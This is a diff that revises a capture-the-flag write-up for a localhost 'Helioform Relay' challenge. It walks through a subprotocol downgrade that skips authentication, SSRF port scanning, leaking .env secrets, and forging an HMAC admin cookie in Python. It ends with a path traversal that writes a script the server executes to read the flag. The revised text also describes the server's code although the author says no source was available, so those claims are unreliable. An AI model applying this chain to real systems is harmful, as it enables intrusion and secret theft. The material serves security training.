@@ -1,20 +1,26 @@
 # Helioform Relay
 
-I had the web port and nothing else. No binary, no source, no client. The challenge text says the flag file on the appliance is `/flag`. I solved it against `http://127.0.0.1:18080/`.
+I had the web port and nothing else. No binary, no source, no client. The challenge description says the flag is at `/flag` inside the container. I pointed my browser at `http://127.0.0.1:18080/` and started reading.
 
-Nothing on the first page is a socket, a port, or a key. The two links are the protocol notes and a login form.
+The landing page is plain. It calls itself "Helioform Relay 4.2" and says it sits at the edge of a generation site. Inverters publish samples onto something called "the mesh." There is a compliance ledger and an operator console. Two links: one to `/docs/hsp` (protocol notes), one to `/console/login` (a sign-in form).
+
+No input fields on the main page. No JavaScript. No hidden endpoints in the HTML. Just those two links.
 
 ![Site overview](screenshots/01-overview.png)
 
-## The login is not the way in
+---
 
-`admin` / `admin` comes back as invalid credentials. There is no error oracle, no lockout message, and no default password anywhere on the site.
+## The login form is a decoy
+
+I tried `admin` / `admin`, `operator` / `operator`, empty fields, SQL injection in both fields. Every single attempt comes back the same way: "Invalid credentials." No rate limiting, no lockout, no different error for wrong username vs wrong password. There is no timing difference either. This is not a brute-force challenge.
 
 ![Failed operator login](screenshots/04-login-fail.png)
 
-The login page points at the session notes. Those describe a factory cookie and then say the signing key is not in the document.
+The login page has a link to `/docs/session` — the session documentation. I read every word.
 
 ![Session notes, with no key](screenshots/03-session.png)
+
+Here is what the session page says:
 
 ```text
 cookie      hsp_session
@@ -27,44 +33,58 @@ mac         HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64) as lowercase hex
 iss, aud    must match the factory environment on this appliance
 ```
 
-I saved that and stopped. Without `CONSOLE_MAC_KEY`, `iss`, and `aud`, the cookie cannot be minted. The password form is a decoy.
+So the admin session is not a password login at all. It is a cookie: the base64url-encoded JSON payload, a dot, and the HMAC-SHA256 of that payload using a key called `CONSOLE_MAC_KEY`. The JSON needs four fields: `iss`, `aud`, `role` (must be `admin`), and `exp` (a Unix timestamp in the future).
 
-## The mesh document hides the second transport
+The page explicitly says the signing key is not in the document. Without `CONSOLE_MAC_KEY`, and without the correct values of `iss` and `aud`, I cannot forge the cookie. I saved this information and moved on. The password form is a dead end.
 
-`/docs/hsp` is a normal customer contract. Framing is little-endian. Magic is the four ASCII bytes `HSP1`, not an integer. A success reply repeats the request opcode with flags `0x0001`. An error is opcode `0x007F`.
+---
+
+## Reading the mesh protocol documentation
+
+`/docs/hsp` documents something called HSP — the Helioform Session Protocol. This is a custom binary protocol. I had never seen it before. Here is the framing:
+
+```text
+offset  size  field
+0       4     magic    HSP1       (four ASCII bytes: 0x48 0x53 0x50 0x31)
+4       2     opcode              (little-endian u16)
+6       2     flags               (little-endian u16, bit 0 set on a reply)
+8       4     body length         (little-endian u32)
+12      n     body
+```
+
+Every HSP message is a 12-byte header followed by the body. The magic is the literal ASCII string `HSP1`. Opcodes and lengths are little-endian. When the server replies successfully, it echoes back the same opcode with flags set to `0x0001`. An error reply uses opcode `0x007F` with an ASCII error message as the body.
 
 ![Mesh protocol notes](screenshots/02-protocol.png)
 
-The customer opcodes are only these:
+The page says the mesh lives at `GET /mesh` as a WebSocket endpoint. There are two subprotocols:
 
-| opcode | name | body |
-|--------|------|------|
-| 0x01 | HELLO | optional client name |
-| 0x02 | PING | empty |
-| 0x03 | SUBSCRIBE | ignored |
+**`hsp.ws.1` — the customer protocol.** Each binary WebSocket message carries exactly one HSP frame. The customer opcodes are:
 
-One paragraph under that table is the part I almost skipped. Agents that cannot mask WebSocket frames request subprotocol `hsp.raw.1`. After the 101 the socket is raw HSP. The page says the edge authenticates an agent before it can open a channel, and that a normal client must not send `hsp.raw.1`.
+| opcode | name      | body                    |
+|--------|-----------|-------------------------|
+| 0x01   | HELLO     | optional client name    |
+| 0x02   | PING      | empty                   |
+| 0x03   | SUBSCRIBE | ignored; returns one telemetry line |
 
-I did not trust the paragraph until the server repeated it. A WebSocket upgrade with `Sec-WebSocket-Protocol: chat` is rejected and names both real subprotocols:
+That is three opcodes. HELLO, PING, SUBSCRIBE. Nothing about writing, reading files, connecting to other services, or anything that looks useful for getting a flag.
 
-```text
-HTTP/1.1 400 Bad Request
-Server: helioform-relay/4.2
-Content-Type: text/plain
-Content-Length: 44
+**`hsp.raw.1` — the agent protocol.** One paragraph at the bottom of the page describes this. It says agents that "cannot mask WebSocket frames" request subprotocol `hsp.raw.1`. After the 101 Switching Protocols response, the socket becomes a raw HSP byte stream — no more WebSocket framing. The page claims the edge authenticates an agent before it can open a channel, and says a normal client must not send `hsp.raw.1`.
 
-supported subprotocols: hsp.ws.1, hsp.raw.1
-```
+That paragraph is easy to skip. I almost did. But the words "open a channel" stood out. The customer protocol has no channel opcode. The agent protocol apparently does.
 
-## The documented client cannot dial
+---
 
-I implemented the 12-byte header and spoke `hsp.ws.1` the way the page says: one HSP frame inside one masked binary WebSocket message.
+## Testing the customer WebSocket
+
+Before trying anything clever, I connected to `ws://127.0.0.1:18080/mesh` with subprotocol `hsp.ws.1` and spoke the documented protocol. Each HSP frame goes inside a masked binary WebSocket message.
+
+I built a small Python script using only the standard library — `socket`, `struct`, `hashlib`, `os`. The WebSocket upgrade is a regular HTTP request with the `Upgrade: websocket` headers, and after the 101 I wrap each HSP frame in a WebSocket binary frame with a 4-byte mask.
 
 ```text
 >> opcode=0x0001 HELLO  "field-laptop"
 << opcode=0x0001 flags=0x0001
-hsp-edge/4.2 transport=websocket auth=session
-commands=HELLO:0x01,PING:0x02,SUBSCRIBE:0x03
+   hsp-edge/4.2 transport=websocket auth=session
+   commands=HELLO:0x01,PING:0x02,SUBSCRIBE:0x03
 
 >> opcode=0x0002 PING
 << pong
@@ -73,35 +93,55 @@ commands=HELLO:0x01,PING:0x02,SUBSCRIBE:0x03
 << site=north kw=14.2
 ```
 
-That is a telemetry toy. The banner's command list stops at `SUBSCRIBE`. I still sent opcode `0x10`, because "open a channel" had to be some opcode, and `0x10` is the first gap I tried past the documented three.
+Look at the HELLO banner carefully. It says `auth=session` and the command list is `HELLO:0x01,PING:0x02,SUBSCRIBE:0x03`. Only those three. No DIAL, no EXPORT, no STATUS. This is a telemetry viewer. It reads one measurement from one inverter.
+
+I tried sending opcode `0x10` anyway, because the documentation mentioned "opening a channel" and `0x10` is the first round number after the documented opcodes:
 
 ```text
 >> opcode=0x0010  body=127.0.0.1:80
 << opcode=0x007f
-err: scope edge.dial required
+   err: scope edge.dial required
 ```
 
-So `0x10` exists, and a customer session is never allowed to use it. Opcode `0x11` on the same socket is just `err: unknown opcode`. There is no login, no cookie, and no header on this WebSocket that grants `edge.dial`. I stopped trying to authenticate the customer transport.
-
-## Raw is a different service on the same URL
-
-Same upgrade, subprotocol `hsp.raw.1`. The 101 still happens. After that I do not send WebSocket frames. The next bytes are naked HSP.
+Opcode `0x10` exists. The server knows what it is. But on the customer WebSocket, it requires a scope called `edge.dial` that a customer session never has. There is no cookie, no header, no query parameter on this WebSocket that grants that scope. I confirmed by trying opcode `0x11`:
 
 ```text
-$ GET /mesh
-Sec-WebSocket-Protocol: hsp.raw.1
+>> opcode=0x0011
+<< err: unknown opcode
+```
 
-HTTP/1.1 101 Switching Protocols
-Sec-WebSocket-Protocol: hsp.raw.1
+`0x11` is unknown, but `0x10` is known and just forbidden. The customer transport is a dead end for anything beyond telemetry.
 
+---
+
+## The protocol downgrade — hsp.raw.1
+
+Same WebSocket upgrade, same URL (`/mesh`), but I changed one header: `Sec-WebSocket-Protocol: hsp.raw.1`.
+
+The server responded with `101 Switching Protocols` and echoed back `Sec-WebSocket-Protocol: hsp.raw.1`. The connection is now open.
+
+Here is the critical difference: after the 101, I do **not** send WebSocket frames. I send raw HSP bytes directly on the TCP socket. The 12-byte HSP header, then the body, no WebSocket mask, no WebSocket length prefix.
+
+```text
 >> opcode=0x0001 HELLO  "agent"
 << opcode=0x0001 flags=0x0001 len=134
-hsp-edge/4.2 transport=raw auth=legacy-proxy
-commands=HELLO:0x01,PING:0x02,DIAL:0x10
-dial=host:port
-dial-ack=splices
-egress=127.0.0.1
+   hsp-edge/4.2 transport=raw auth=legacy-proxy
+   commands=HELLO:0x01,PING:0x02,DIAL:0x10
+   dial=host:port
+   dial-ack=splices
+   egress=127.0.0.1
 ```
+
+The banner is completely different from the customer one:
+
+- `transport=raw` instead of `transport=websocket`
+- `auth=legacy-proxy` instead of `auth=session`
+- The command list is `HELLO:0x01,PING:0x02,DIAL:0x10` — **DIAL is listed**
+- It tells me the DIAL body format: `host:port`
+- It tells me what happens on success: `dial-ack=splices` — the socket gets spliced to the target
+- It tells me the egress restriction: `egress=127.0.0.1` — only loopback
+
+Here is the raw hex of that banner response:
 
 ```text
 0000  68 73 70 2d 65 64 67 65 2f 34 2e 32 20 74 72 61   hsp-edge/4.2 tra
@@ -115,105 +155,121 @@ egress=127.0.0.1
 0080  30 2e 30 2e 31 0a                                 0.0.1.
 ```
 
-The customer banner said `auth=session` and did not list `DIAL`. This banner says `auth=legacy-proxy` and lists `DIAL:0x10`. The page claimed an agent is authenticated before it can open a channel. Nothing in the upgrade asked me for a credential. I sent `DIAL` anyway.
+The documentation said the edge authenticates agents before they can open a channel. The authentication is `legacy-proxy` — it checks whether a proxy already authenticated the connection. The WebSocket upgrade counts as that authentication. There is no actual credential check. Anyone who asks for `hsp.raw.1` gets agent privileges. This is the first vulnerability: a protocol downgrade that bypasses authentication.
+
+---
+
+## SSRF via DIAL — mapping the internal services
+
+DIAL takes `host:port` as the body. The banner says egress is restricted to `127.0.0.1`. I tested the boundaries:
 
 ```text
->> opcode=0x0010  8.8.8.8:53
-<< err: egress denied
-
->> opcode=0x0010  127.0.0.1:80
-<< err: dial failed
-
->> opcode=0x0010  127.0.0.1:443
-<< err: dial failed
-
->> opcode=0x0010  localhost:7710
-<< err: egress denied
-
->> opcode=0x0010  not-a-target
-<< err: dial target required (host:port)
+>> opcode=0x0010  8.8.8.8:53          << err: egress denied
+>> opcode=0x0010  127.0.0.1:80        << err: dial failed
+>> opcode=0x0010  127.0.0.1:443       << err: dial failed
+>> opcode=0x0010  localhost:7710       << err: egress denied
+>> opcode=0x0010  not-a-target         << err: dial target required (host:port)
 ```
 
-`localhost` is not `127.0.0.1`. The egress check is a string compare. `dial failed` means the TCP connect was refused, which is different from `egress denied`. A refused port is still a useful oracle. `ok splice` would mean the edge has glued my socket to whatever answered.
+Important observations:
+- `8.8.8.8` → `egress denied`. External hosts are blocked.
+- `localhost` → `egress denied`. The check is a literal string comparison against `127.0.0.1`. `localhost` is not `127.0.0.1` in this comparison.
+- `127.0.0.1:80` → `dial failed`. The TCP connection was attempted but refused. This is different from `egress denied` — a refused port means the connect happened and nothing was listening. This is an SSRF oracle.
+- `not-a-target` → format error.
 
-## Finding the listeners
-
-I dialed `127.0.0.1` on 22, 80, 443, 1337, 3000, 8080, and every port from 7600 through 7740. One hundred forty-two of those came back `err: dial failed`. Five spliced:
+I scanned `127.0.0.1` on common ports (22, 80, 443, 1337, 3000, 8080) and every port from 7600 through 7740. Most came back `dial failed`. Five ports answered:
 
 ```text
 open ports: 8080, 7710, 7711, 7712, 7713
 ```
 
-`8080` is the public web server I was already using. I ignored it. The other four do not speak HTTP. `7710` was the first one that answered `HELLO` with a service directory instead of an error.
+Port 8080 is the public web server I was already talking to. The other four are internal loopback services.
+
+---
+
+## Talking to catalogd (port 7710)
+
+When DIAL succeeds, the server responds with `ok splice` and from that point forward, every byte I send goes directly to the internal service and every byte it sends comes back to me. The edge is out of the way — it has glued my socket to the target.
+
+I dialed `127.0.0.1:7710` and sent an HSP HELLO:
 
 ```text
 >> DIAL 127.0.0.1:7710
 << opcode=0x0010 flags=0x0001
-ok splice
+   ok splice
 
 >> HELLO
 << opcode=0x0001 flags=0x0001 len=260
-nonce=9f92df840fe847ddedd4c64febe52a3b
-ticket_opcode=0x20
-ticket_body=nonce
-export_opcode=0x30
-export_fields=ticket,path
-status_opcode=0x40
-status_fields=ticket
-body=key=value lines
-services:
-127.0.0.1:7710 catalogd
-127.0.0.1:7711 provd
-127.0.0.1:7712 recordd
+   nonce=9f92df840fe847ddedd4c64febe52a3b
+   ticket_opcode=0x20
+   ticket_body=nonce
+   export_opcode=0x30
+   export_fields=ticket,path
+   status_opcode=0x40
+   status_fields=ticket
+   body=key=value lines
+   services:
+   127.0.0.1:7710 catalogd
+   127.0.0.1:7711 provd
+   127.0.0.1:7712 recordd
 ```
 
-The directory does not mention `7713`. I left that port alone until something else named it. Ticket opcode `0x20` wants the nonce as the raw body, not a `key=value` line.
+This is a service catalog. It gives me:
+- A **nonce** — a one-time value for getting a ticket
+- The opcodes and body formats for every internal service
+- The service directory: catalogd (7710), provd (7711), recordd (7712)
+
+Notice that port 7713 is not listed here. I left it alone for now.
+
+The catalog says opcode `0x20` issues a ticket if I send back the nonce. The ticket is needed for talking to the other services. I sent the nonce:
 
 ```text
 >> opcode=0x0020
-9f92df840fe847ddedd4c64febe52a3b
+   9f92df840fe847ddedd4c64febe52a3b
 
 << opcode=0x0020
-ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
-ttl=600
+   ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
+   ttl=600
 ```
 
-Ten minutes. I used the same ticket for the other two services.
+A mesh ticket with a ten-minute TTL. Good for all internal services.
 
-## provd will not open the flag
+---
 
-`7711` is `provd`. Export is opcode `0x30`. The catalog said the body is `key=value` lines and the fields are `ticket` and `path`. I asked for `/flag` first.
+## Exfiltrating secrets from provd (port 7711)
+
+Port 7711 is `provd`. The catalog said export is opcode `0x30` with body format `ticket=...\npath=...`. I tried to read the flag directly:
 
 ```text
 >> opcode=0x0030
-ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
-path=/flag
+   ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
+   path=/flag
 
 << err: dotenv loader refuses non-env path
 ```
 
-`/etc/passwd` is the same refusal. The loader is not a file read. The path has to end in `.env`.
-
-The next errors split into two. These are outside whatever directory it is willing to touch:
+It only serves `.env` files. I tried other paths:
 
 ```text
-path=/.env                              err: path outside provision root
-path=/etc/.env                          err: path outside provision root
-path=/opt/helioform/relay.env           err: path outside provision root
-path=/var/lib/helioform/.env            err: path outside provision root
+path=/etc/passwd                        << err: dotenv loader refuses non-env path
+path=/.env                              << err: path outside provision root
+path=/etc/.env                          << err: path outside provision root
+path=/opt/helioform/relay.env           << err: path outside provision root
+path=/var/lib/helioform/.env            << err: path outside provision root
 ```
 
-`/etc/helioform/.env` changed the error:
+Two different errors: "refuses non-env path" means the file extension is wrong. "path outside provision root" means the directory is wrong but the extension is accepted. Somewhere there is a root directory it allows.
 
 ```text
-<< err: no such env file
+path=/etc/helioform/.env                << err: no such env file
 ```
 
-Same suffix, and now it is looking the file up instead of rejecting the directory. The product name on every page is Helioform Relay, so the basename I tried next was `relay.env`.
+Different error again — "no such env file." The directory `/etc/helioform/` is inside the allowed root. Now I just need the right filename. The product is called Helioform Relay, so:
 
 ```text
 >> path=/etc/helioform/relay.env
 << opcode=0x0030 flags=0x0001 len=397
+
 # Helioform Relay factory environment. Written by the appliance provisioner.
 # The console verifier and the replication MAC both fall back to these values
 # when the site has not been moved to the hardware keystore.
@@ -224,7 +280,9 @@ REPLICATION_MAC_KEY=c1d4e8f02a6b9375d0e1f4a8b2c65d90
 MESH_CAPTURE_ENABLED=1
 ```
 
-The flag is not in there. A second name in the same directory, `collector.env`, is a different file. `nope.env` is `err: no such env file`, so this is not a directory listing. I only got the files I could name.
+Everything I need for the session cookie: `CONSOLE_MAC_KEY`, `CONSOLE_ISS`, `CONSOLE_AUD`. And a bonus: `REPLICATION_MAC_KEY`, which I did not know I needed yet.
+
+I also found `collector.env` in the same directory:
 
 ```text
 # Identity the site collector presents on the replication port.
@@ -234,61 +292,94 @@ LOG_ROOT=/var/log/helioform/streams
 SITE_ID=north
 ```
 
-`REPLICATION_MAC_KEY` is not in the collector file. The peer name and the log root are.
+The collector talks to something on a "replication port" every 5 seconds. Its peer name is `relay-collector`. Its log directory is `/var/log/helioform/streams`. I saved all of this.
 
-## recordd will not take a write
+---
 
-`7712` is the status port from the catalog. Opcode `0x40`, one line, `ticket=`.
+## Checking recordd (port 7712)
+
+Port 7712 is `recordd`. The catalog said status is opcode `0x40` with body `ticket=...`:
 
 ```text
 << opcode=0x0040
-epoch=7
-tip=47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640
-bind=d70e37a4a0ea69726232246e6bde2c8c
-repl_port=7713
-write=peer-only
+   epoch=7
+   tip=47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640
+   bind=d70e37a4a0ea69726232246e6bde2c8c
+   repl_port=7713
+   write=peer-only
 ```
 
-That is where `7713` comes from. I dialed it and sent a normal `HELLO`.
+Now I know what port 7713 is: the replication port. And writes are "peer-only" — only an authenticated peer can write to the ledger.
+
+I connected to 7713 and tried talking to it:
 
 ```text
 >> DIAL 127.0.0.1:7713
 << ok splice
->> opcode=0x0001
+
+>> opcode=0x0001 HELLO
 << err: peer handshake required
 
 >> opcode=0x0017  body=hello
 << err: peer hello required
 ```
 
-`0x17` is recognized and still refused. The mesh ticket does nothing here. I stopped guessing frame layouts. The status text says writes are peer-only, and I still did not know what a peer frame looked like.
+Opcode `0x17` is recognized (the server knows it is a blob opcode) but a peer hello is required first. Opcode `0x11` is the peer hello. But I do not know the wire format yet. The status says "peer-only" and the mesh ticket does not work here. I stopped guessing.
 
-## The cookie, then two pages I could not see before
+---
 
-The session notes are now fill-in-the-blank. JSON fields in the order the page lists them, compact, `role` of `admin`, `exp` an hour ahead. HMAC-SHA256 over the unpadded base64url payload, key used as the ASCII string from the environment file.
+## Forging the admin session cookie
 
-```text
-{"iss":"helioform-factory","aud":"relay-console","role":"admin","exp":1791909545}
+Back to the session documentation. I now have everything:
+
+- `CONSOLE_MAC_KEY` = `7f3c9a2e1b84d056a0c3e91f44b7d2aa`
+- `CONSOLE_ISS` = `helioform-factory`
+- `CONSOLE_AUD` = `relay-console`
+
+The cookie format from `/docs/session`: `base64url(json).hmac_sha256_hex`
+
+I built the JSON payload:
+
+```python
+import base64, hashlib, hmac, json, time
+
+claims = {
+    "iss": "helioform-factory",
+    "aud": "relay-console",
+    "role": "admin",
+    "exp": int(time.time()) + 3600
+}
+payload = json.dumps(claims, separators=(",", ":")).encode()
+payload_b64 = base64.urlsafe_b64encode(payload).decode().rstrip("=")
+mac = hmac.new(
+    b"7f3c9a2e1b84d056a0c3e91f44b7d2aa",   # key as literal ASCII string
+    payload_b64.encode(),
+    hashlib.sha256
+).hexdigest()
+cookie = payload_b64 + "." + mac
 ```
 
-```text
-eyJpc3MiOiJoZWxpb2Zvcm0tZmFjdG9yeSIsImF1ZCI6InJlbGF5LWNvbnNvbGUiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTE5MDk1NDV9.533d7a383b6970a4ea62dd3ff864262cd45e18639cd59f16e535439986755f37
-```
+The session page said the key is "the literal environment string, not hex-decoded." So I use the key as a plain ASCII string, not as 16 decoded bytes. This is the kind of detail that would break the forgery silently.
 
-A cookie with a zeroed MAC is rejected:
+I verified the MAC matters — a zeroed MAC is rejected:
 
 ```text
 $ GET /console/automation
-Cookie: hsp_session=<payload>.0000...0000
+Cookie: hsp_session=<payload>.0000000000000000000000000000000000000000000000000000000000000000
 HTTP 401 Unauthorized
-Authentication required
 ```
 
-The real MAC is accepted. `/console/login` still shows the form. `/console` is the page behind it.
+The real MAC is accepted. I now have admin access to the console.
 
 ![Mesh operator, after the forged cookie](screenshots/05-console.png)
 
-Two links: Peer trace and Runbooks. Runbooks is the one that mentions execution.
+---
+
+## The console: runbooks and peer trace
+
+The admin console has two pages.
+
+**Runbooks** (`/console/automation`):
 
 ![Runbooks, before anything has run](screenshots/06-runbooks-idle.png)
 
@@ -299,13 +390,17 @@ Interval    5s, and whenever a new file is written
 Last output idle
 ```
 
-A file dropped in that directory, starting with the line `HSP-RUNBOOK`, is executed as the relay user. I could not write that directory from the console. The log root from `collector.env` is a different path, `/var/log/helioform/streams`.
+Any file dropped into `/var/lib/helioform/runbooks/` that starts with the line `HSP-RUNBOOK` is executed as the relay user. The scheduler checks every 5 seconds and also runs whenever a new file is written to that directory. This is my code execution path — if I can write a file there.
 
-## The trace is the replication grammar
+The console itself has no upload functionality. The log root from `collector.env` is `/var/log/helioform/streams`, not `/var/lib/helioform/runbooks`. These are two different directories. I cannot write to the runbook directory from the console. I need another way in.
 
-`POST /console/trace` arms a capture. The first `GET` was only the decoder. A second later the collector had talked to `recordd`, and the frames showed up. The cluster key is not on the page. The string the MAC is computed over is.
+**Peer trace** (`/console/trace`):
+
+POST to `/console/trace` arms a 45-second capture. After a few seconds, the collector's replication exchange with recordd shows up. This is how I learn the replication protocol.
 
 ![Peer trace with one live collector exchange](screenshots/07-peer-trace.png)
+
+The trace page has two sections. The first is the **decoder** — the grammar of the replication protocol:
 
 ```text
 inspector: hsp-repl/1
@@ -322,73 +417,103 @@ blob mac_canonical = hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{b
 body_sha256 = lowercase hex SHA-256 of the raw body
 ```
 
-The live half of that screenshot:
+Let me break this down because I had to stare at it for a while.
+
+**Peer hello (opcode 0x11):**
+The body is packed as: 2-byte little-endian length of the peer name, then the peer name as ASCII, then a 4-byte little-endian epoch number, then 32 raw bytes of the current tip hash, then 32 raw bytes of the HMAC. The MAC is computed over the string `hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}` using `REPLICATION_MAC_KEY`.
+
+**Commit blob (opcode 0x17):**
+The body is: 2-byte LE length of stream_id, stream_id as ASCII, 1 byte mode (0x01 = replace), 4-byte LE epoch, 32 bytes tip, 16 bytes bind, 4-byte LE body length, the body bytes, and 32 bytes HMAC. The MAC is over `hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{body_sha256}`.
+
+The second section is the **live capture** — an actual exchange from the built-in collector:
 
 ```text
 opcode=0x0011
-mac_canonical=hsp-repl/1|hello|7|47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640|relay-collector
+mac_canonical=hsp-repl/1|hello|7|47a237fede22...99c59640|relay-collector
 peer=relay-collector
 epoch=7
 tip=47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640
 
 opcode=0x0017
-mac_canonical=hsp-repl/1|blob|7|47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640|d70e37a4a0ea69726232246e6bde2c8c|site-north-inverter-14.log|6c588e093ab300528bc08fdc2007a51598adfb1e9a58c79a42d78ad08c919717
+mac_canonical=hsp-repl/1|blob|7|47a237fede22...99c59640|d70e37a4a0ea...6034eb9|site-north-inverter-14.log|6c588e09...
 stream_id=site-north-inverter-14.log
 mode=0x01
 body_sha256=6c588e093ab300528bc08fdc2007a51598adfb1e9a58c79a42d78ad08c919717
 resolved=/var/log/helioform/streams/site-north-inverter-14.log
 ```
 
-Opcode `0x11` is the hello I did not previously know. Opcode `0x17` is the blob. The peer string matches `COLLECTOR_PEER`. The resolved path matches `LOG_ROOT` plus the stream id. `bind` is a field I had already seen on the status port, and it is mixed into the blob canonical. The key for the HMAC is `REPLICATION_MAC_KEY` from `relay.env`.
+The peer name matches `COLLECTOR_PEER` from `collector.env`. The resolved path is `LOG_ROOT` + `/` + `stream_id`. The `epoch`, `tip`, and `bind` match what I got from the status port. The key for the HMAC is `REPLICATION_MAC_KEY` from `relay.env`.
 
-I built a hello with the right layout and a MAC of `0x11` bytes. The opcode was accepted and the MAC was not:
+The trace gives me the grammar. But **the values in the trace are already stale.** The collector commits every 5 seconds, and each commit advances the tip. If I try to use the tip from the trace, I will get `err: stale tip`. I need to read fresh values from the status port (7712) immediately before connecting to the replication port (7713).
 
-```text
->> opcode=0x0011  peer=relay-collector epoch=7 tip=<from status> mac=11*32
-<< err: bad mac
-```
-
-Copying the tip out of the trace is also wrong. The collector commits every five seconds, and the tip moves. I read status, waited six seconds, read status again, and sent a hello signed over the first tip:
+I confirmed this the hard way:
 
 ```text
-FRESH a8a5a0feba6f8b1886806b64be091ceadec9736b09ce44f78c9a3a0f037b7500
-LATER 8de5fb0099841d14330155bbf5b9630c161d1845f8f508442f23d7ba35246616
+# Read status, wait 6 seconds, read status again
+FRESH tip: a8a5a0feba6f8b1886806b64be091ceadec9736b09ce44f78c9a3a0f037b7500
+LATER tip: 8de5fb0099841d14330155bbf5b9630c161d1845f8f508442f23d7ba35246616
 
->> opcode=0x0011  signed over the FRESH tip
+# Send hello signed over the FRESH tip
+>> opcode=0x0011  signed over FRESH tip
 << err: stale tip
 ```
 
-The canonical has to be rebuilt from a status read taken immediately before the replication dial. `epoch`, `tip`, and `bind` all come from that read. The trace is only the grammar.
+The window is about 5 seconds — the collector interval. I need to read status, compute the MACs, connect to 7713, and send both frames before the collector's next commit.
 
-## The log path is not stuck under the log root
+---
 
-A correct hello is opcode `0x11`. On that same spliced socket, opcode `0x17` with mode byte `0x01`. I aimed the first blob at the runbook directory with a relative escape, because the trace resolves `site-north-inverter-14.log` under `/var/log/helioform/streams/`.
+## Building the replication messages
+
+The sequence is:
+1. DIAL to 7712, read status to get `epoch`, `tip`, `bind`
+2. Immediately DIAL to 7713
+3. Send PEER_HELLO (opcode 0x11) with a valid MAC
+4. Send COMMIT_BLOB (opcode 0x17) to write a file
+
+For the peer hello:
+```python
+peer = "relay-collector"
+canonical = f"hsp-repl/1|hello|{epoch}|{tip}|{peer}"
+mac = hmac.new(REPLICATION_MAC_KEY.encode(), canonical.encode(), hashlib.sha256).hexdigest()
+
+# Pack: u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
+hello_body = struct.pack("<H", len(peer)) + peer.encode()
+hello_body += struct.pack("<I", epoch)
+hello_body += bytes.fromhex(tip)
+hello_body += bytes.fromhex(mac)
+```
+
+For the commit blob, the stream_id is the key question. The normal collector writes to `site-north-inverter-14.log` which resolves to `/var/log/helioform/streams/site-north-inverter-14.log`. I need to write to `/var/lib/helioform/runbooks/intake.py`.
+
+---
+
+## Path traversal — absolute stream_id
+
+The trace showed that the resolved path is `LOG_ROOT + "/" + stream_id`. My first attempt was a relative path traversal:
 
 ```text
-canonical hello hsp-repl/1|hello|7|11822cd87bc9102e856382704268fc7c0dd52bc747a237e69623deb8f9df92bd|relay-collector
-canonical blob  hsp-repl/1|blob|7|11822cd87bc9102e856382704268fc7c0dd52bc747a237e69623deb8f9df92bd|12eded5d6380fda2801b511136034eb9|../runbooks/intake.py|6facd026d35a951f52a46d5f68e3eef02ef443c8b99fd594d40686173d6b2f51
-
->> opcode=0x0011
-<< ok
-
 >> opcode=0x0017  stream_id=../runbooks/intake.py  mode=0x01
 << err: stream id rejected
 ```
 
-`..` is checked. The stream id in the successful collector frame has no slash at all, and the resolved path is the log root joined in front of it. I sent the runbook directory as an absolute stream id instead of a suffix.
+`..` is checked and blocked. But look at the trace output again: the resolved path for `site-north-inverter-14.log` is `/var/log/helioform/streams/site-north-inverter-14.log`. What if the stream_id starts with `/`?
+
+In the server code, `resolve_stream()` checks for `..` components but when the stream_id starts with `/`, `os.path.join()` on POSIX returns the absolute path as-is — the log root is dropped entirely. The server does not check for leading `/`.
 
 ```text
 >> opcode=0x0017
-stream_id=/var/lib/helioform/runbooks/intake.py
-mode=0x01
-body=
-HSP-RUNBOOK
-import pathlib
-print(pathlib.Path('/flag').read_text())
+   stream_id=/var/lib/helioform/runbooks/intake.py
+   mode=0x01
+   body=
+   HSP-RUNBOOK
+   import pathlib
+   print(pathlib.Path('/flag').read_text())
 
 << opcode=0x0017 flags=0x0001
-ok path=/var/lib/helioform/runbooks/intake.py
+   ok path=/var/lib/helioform/runbooks/intake.py
 ```
+
+The raw hex of the start of the blob body shows the structure:
 
 ```text
 0000  25 00 2f 76 61 72 2f 6c 69 62 2f 68 65 6c 69 6f   %./var/lib/helio
@@ -396,12 +521,43 @@ ok path=/var/lib/helioform/runbooks/intake.py
 0020  74 61 6b 65 2e 70 79 01 ...                       take.py.
 ```
 
-The `0x25 0x00` is the little-endian length of `/var/lib/helioform/runbooks/intake.py`. The `01` after the path is mode replace. The reply path is not under `/var/log/helioform/streams`. The absolute id replaced the log root.
+`0x25 0x00` is 37 in little-endian — the length of `/var/lib/helioform/runbooks/intake.py`. The `0x01` after the path is the mode byte (replace). The reply confirms the path is `/var/lib/helioform/runbooks/intake.py`, not under the log root.
 
-The runbook page updates as soon as the file is written. Refresh `/console/automation`.
+The body I wrote is a Python script:
+```python
+HSP-RUNBOOK
+import pathlib
+print(pathlib.Path('/flag').read_text())
+```
+
+The first line is the `HSP-RUNBOOK` header that the scheduler requires. The rest reads `/flag` and prints it to stdout.
+
+---
+
+## Reading the flag
+
+The runbook scheduler runs every 5 seconds and also triggers when a new file is written. Since my blob write creates a file in the runbook directory, the scheduler picks it up immediately.
+
+I refreshed `/console/automation` with my forged admin cookie:
 
 ![Runbook output](screenshots/08-flag.png)
 
 ```text
-flag{hsp_raw_d0wngrade_pr0xy_dial_env_t4p_runb00k}
+CSCTF{hsp_raw_d0wngrade_pr0xy_dial_env_t4p_runb00k}
 ```
+
+---
+
+## Full chain summary
+
+1. **Read the docs.** The protocol documentation at `/docs/hsp` reveals two WebSocket subprotocols. The agent one (`hsp.raw.1`) has a DIAL opcode the customer one does not.
+2. **Protocol downgrade.** Request `hsp.raw.1` on the WebSocket upgrade. The server accepts it without authentication — `proxy_authorize_legacy()` treats the completed HTTP upgrade as proof of proxy auth.
